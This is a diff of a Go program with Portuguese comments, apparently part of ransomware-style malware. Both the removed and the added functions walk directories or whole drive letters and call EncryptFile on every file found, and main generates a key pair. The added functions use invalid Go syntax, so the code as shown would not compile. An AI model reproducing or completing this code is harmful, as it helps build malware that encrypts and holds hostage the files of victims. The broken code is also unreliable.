@@ -75,45 +75,22 @@
 		  }
 
 			
+			func Chuk(chunk path,chunkInfo os.FileInfo, e error) error{
+			EncryptFile(chunk)
 			
-			
-			
-			
-
-
-			func EnumerateFiles(root string) {
-			  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-
-			   if !info.IsDir() {
-				EncryptFile(path)
-			   }
-			   return nil
-			  })
-			  if err != nil {
-			   fmt.Printf("Erro ao percorrer o diretório: %v\n", err)
-			   return
-			  } // se info.IsDir() nao for pasta e um arquivo
 			}
-
-			func EnumerateFolders(root string) {
-			  err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
-			   if err != nil {
-				//fmt.Printf("Erro ao acessar o caminho %q: %v\n", path, err")
-				return err
-			   }
-			   if info.IsDir() {
-				fmt.Println(path)
-
-			   }else{
-			   fmt.Printf("unidade de disco nao encontrada")
-			   } //se info.IsDir for uma pasta passe para funçao de enumeraçao de arquivos vamos testar
-			   return nil
-			  })
-			  if err != nil {
-			   // fmt.Printf("Erro ao percorrer o diretório: %v\n", err")
-			   return
-			  }
+			
+			func ScanDriverLetter(string letter)(error){
+			e:=filepath.Walk(letter,Chuk)
+			
+			return e
+			
+			
 			}
+			
+
+
+			
 
 			func main() {
 			GenerateKeyPair()
